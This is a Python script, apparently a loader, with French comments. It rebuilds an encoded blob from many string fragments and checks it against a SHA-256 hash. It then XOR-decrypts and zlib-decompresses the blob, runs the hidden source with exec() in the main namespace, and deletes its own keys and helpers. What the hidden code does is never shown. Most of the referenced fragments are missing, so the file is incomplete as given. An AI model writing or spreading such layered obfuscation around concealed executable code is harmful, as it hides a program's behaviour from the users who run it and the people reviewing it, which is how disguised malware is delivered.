_cnvyJEtU6QXyuI = 'UUom!3*OOLh0)2XIm*<k}Pv`r7R7d1Z`-OS4?GhMp0&BXagV=r*nwjZbq4*omx_'
_cxnn0cZvJmr8VD = 'q%+zzqt'

_poXqlS1phNIP02 = __import__('base64').b85decode(_cuvWfU7Tu9gEx5 + _cci2CpBJhVuY31 + _ce6OBzVPNnVnw8 + _czijvENU1i_qxM + _crjxV7lMFnv09y + _cfBmK1DdXG3e_j + _cofXaSAmTSL_X6 + _cfNx1sB6lbDvN7 + _ctz_SMCY6ovAa5 + _cqpbnsnxFoWDOD + _cbXKR48NQUCKMJ + _cil_UULmUJuh6P + _cs5c5cGPQo4AhE + _c_pe5rF_hvJ3jr + _ciZyfaG7yclCuX + _cpn7wnmHIRgIbM + _cb_UKvXw0gEMAR + _cnBabeJTh992KJ + _cbgDlbfAaGgmOi + _chi26BMngJfN_S + _cvBDgP1rJmyt_D + _csNnRHxg_nFWUS + _caNzpiKKLIxTqa + _clwaBgqb16usTR + _crrdo1yJ0_FOyS + _cbKb48sLHYKPxj + _cuWxNoVd312HXY + _cf82HYO2xVqs6T + _cbTXQeugyjWU3h + _cyJwkunTHtDIsy + _cvSo08L60nkVLI + _ctxWgFgIy_KPZ8 + _caJaP5wHN45dk8 + _cxgAhfIaxGizEz + _cvgQgeIn_sqVep + _cfHShCshAKWpfR + _cfP_9oJFtMMi0S + _clwt3Wvum7Rfoe + _chF4zyIyi7E4iZ + _cyh6pbjd9Njtj8 + _cpRADClh29F851 + _cqAKpwhAJW9pSc + _co0atAQxEwXhT7 + _cakMub556G6fPk + _cpQd4Fc7wVr9yx + _cvkig3DNvtG8Gd + _cbAgfUh1ZezXDT + _crS8D88MOpSaUW + _crIGyT8wl_O_hN + _cjVZ_pTxi1jhCT + _ckOgaH7xagsDt5 + _cmFLkk1xQ6FcHN + _cdOLcGYjbHK9P7 + _cgPQppPxPjiQjg + _cgBQN_dpw4MAso + _ctugB65uRJV5v7 + _ccdHP9dP4Dc2nb + _cxemHcmsHwlRI0 + _chwViBQf6_w8kK + _ccaYopkyf9Pnjj + _cbV64XUMUkM4G3 + _cinb6RR3vg2RrY + _csjlRvGWNZ2gbw + _cwIEHkTgwh5MoW + _cqvfUjtheVkyMZ + _cnjGk2tAFKPcuu + _cywPNVy8UrF90L + _capFJqrxAQd6Nd + _coD50Ifgt5r1wh + _ct5GKuF8UwJj3H + _cyXYY6ALvxs5uA + _ckzgZJFD5QlEYs + _cjlgpuq74WyFsF + _ce03muIWX6Znnx + _czIbumqyTnU9m8 + _coN3dhjhQoh5W1 + _czzF9FCM4JZf_H + _cg6eG5yGQbmoOa + _ce8Lmxuh63yKqm + _chE9aWlFxu_N2r + _cnpy4iSxtsz2Jn + _cijASN8sd8OkX1 + _cfcJHu0gfKjeRu + _chhDEmx2iAwg9Z + _clqkPf6UAmXurP + _cldJU6P_9GgnXf + _cpmBE_xaJWkOpF + _cxaHeWV8P6Uhei + _cu0zVJcDLIoLc9 + _cc7oGMhkaSSMa1 + _ctToZP8cnEszpi + _cidXvLI5tyFXxa + _cgeUXc4c_SF1jg + _cud8whmvIoEy6I + _cxcknBZ6NjVAB2 + _cfHKDVsLrQjyR6 + _chL_ZciCS7lMgb + _cuHTT5h0I8JQQ6 + _cz0qWBShehbV4v + _ciquMW_HqITKBG + _cx97uebu_xB_C9 + _ctfax5socQCURD + _cfwepYYemjIYuh + _cwSrZvOMJG8C7y + _cb1oUjz7LZL8Ss + _chmTii1jUZkS1N + _cbJ7cw7x8c8oXW + _caQniMI04WPG7q + _ct0vaXfANzPJ0a + _ctX3EwpwGizCuF + _cqJpMLNaRSeivv + _cqw5K1KQQIeojB + _csMBeOZ4yKhg2O + _cuhct6x5U41rm6 + _caniecSiP_AkyB + _ciXb9PtK94AbIO + _c_HTEOiz05Scbb + _cbU40mtdoohhcu + _cf8ZiH0ZLe8KaY + _cxG6sLelpT0UMB + _cjeNR6th65bULz + _cic1wYI_gfJUh2 + _cndJaLey5b5ky1 + _cjUyrr0ovT9m27 + _cb04LwQCJuBcvN + _ceuGe3NSfUKI1M + _cwxcESEpLO7XzB + _cbxYUDYlkTJOY_ + _cf1pdv0FtsAC21 + _cr4ZFUemEaCfy_ + _cncfOgT_MsAfkE + _crpC_Z4UpDoZwW + _ch2KWw4dp_RLsB + _cjDiv_O9kEJJIi + _cvjC2OCOYwAXaV + _cnb61m8Fhzllcq + _ckZ_qbjDMUdqJz + _cfkxLJrK_x3sJw + _cuTueoLHRfRlA7 + _crCOPe58_lTMez + _citTUS609X2Zgx + _cyHswBPdOicwch + _cidB5ISUSoiIlN + _cjXQbav7Lsxrwr + _ckezNLCKezW1Q4 + _cfYtlA0K5J1U54 + _cpiaeeXQnLfxYL + _cjCrx5iqMmETw5 + _cyX43Kh3afYRMD + _cmf2QpwCXhRFyh + _cs14B4RtbkDjkz + _cnypr3UWFLy4jI + _cuEwUEPt63OzNi + _ce550IhBlmm4SI + _czM4K_fHdtfrra + _cx1oZiEq7qTlNc + _cznCFkBjwn5n0z + _cmSplfHESE3L_6 + _czEPexYNkVWkvo + _c_7SXLG137ssf6 + _cm0sfXF3z5y2ZB + _cuwmvkpVe6aP6i + _caCJsa4RZtpRnw + _cfZ_Fj8cuznWIT + _cvyQvzimAMPjLT + _cxDuSluYafTnt0 + _cfwCH5Z66YnNHL + _cpbWn_3gH138zu + _cgPyCtbLQHNft4 + _caJ0Exiwe7vsIr + _ch3i7M8cbuxTwh + _cuR_sZ8T3HiyH1 + _cx4l174IAvudSB + _ck2vLD_mK3kXpR + _ctJJPcsNrBzkzV + _cr3mUkxVd8oP1r + _cnvyJEtU6QXyuI + _cxnn0cZvJmr8VD)
if __import__('hashlib').sha256(_poXqlS1phNIP02).hexdigest() != 'dff5231a2165b3a4c6686df367370428d7d594eb44c0924030f1c315c1687c75':
    __import__('sys').exit(1)
_xfQOWpgpxN1vBA = bytes([204, 115, 54, 72, 76, 160, 103, 77, 50, 28, 241, 41, 180, 135, 89, 37, 68, 214, 72, 236, 246, 30, 206, 59, 8, 188, 247, 241, 174, 138, 194, 89])
_fkyZEtwApCVUpiZ = bytes([221, 33, 222, 39, 223, 247, 132, 151, 103, 82, 114, 186, 234, 84, 92, 30, 38, 239, 43, 48, 155, 108, 230, 103, 237, 235, 185, 116, 109, 178, 109, 118])

def _fxusM0Em9gMdgfi(_bjjJRKsn85zJCR, _koam6mA4XiIKic):
    return bytes(_bjjJRKsn85zJCR[_izZPn3JBNoYvDf] ^ _koam6mA4XiIKic[_izZPn3JBNoYvDf % len(_koam6mA4XiIKic)] for _izZPn3JBNoYvDf in range(len(_bjjJRKsn85zJCR)))

def _fdmSyKYetRcIR_C(_ttXMO9duZyO0ky):
    import zlib
    return zlib.decompress(_ttXMO9duZyO0ky) # Un seul niveau de zlib ici pour simplifier

def _fezGKgkfAEbNNg_():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xhntbT5vUm1yWB = _fxusM0Em9gMdgfi(_poXqlS1phNIP02, _xfQOWpgpxN1vBA)
    # 2. Décompression Zlib
    _dxG_gJAHYyXBHV = _fdmSyKYetRcIR_C(_xhntbT5vUm1yWB)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dxG_gJAHYyXBHV.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nsbvKcDhZt_iLW = _main.__dict__
    _nsbvKcDhZt_iLW.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nsbvKcDhZt_iLW)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fezGKgkfAEbNNg_()
try:
    del _fxusM0Em9gMdgfi, _fdmSyKYetRcIR_C, _fezGKgkfAEbNNg_
    del _poXqlS1phNIP02, _xfQOWpgpxN1vBA, _fkyZEtwApCVUpiZ
except:
    pass
